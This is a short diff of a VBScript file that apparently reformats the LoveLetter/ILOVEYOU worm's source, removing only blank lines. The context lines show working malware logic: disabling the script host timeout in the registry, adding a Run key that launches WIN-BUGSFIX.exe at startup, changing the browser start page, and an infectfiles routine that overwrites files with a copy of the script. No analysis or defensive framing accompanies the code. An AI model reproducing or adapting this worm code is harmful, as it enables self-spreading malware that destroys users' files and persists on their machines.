@@ -15,11 +15,9 @@ Sub main()
   Dim wscr, rr
 
   Set wscr = CreateObject("WScript.Shell")
-  
   rr = wscr.RegRead("HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout")
 
   If (rr >= 1) Then
-    
     wscr.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout", 0, "REG_DWORD"
   End If
 
@@ -69,9 +67,7 @@ Sub regruns()
   End If
 
   If (fileexist(downread & "\WIN-BUGSFIX.exe") = 0) Then
-
     regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\WIN-BUGSFIX", downread & "\WIN-BUGSFIX.exe"
-
     regcreate "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\StartPage", "about:blank"
   End If
 End Sub
@@ -108,7 +104,6 @@ Sub infectfiles(folderspec)
 
       ap.write vbscopy
       ap.close
-
     ElseIf (ext = "exe")
       Or (ext = "com")
       Or (ext = "css")
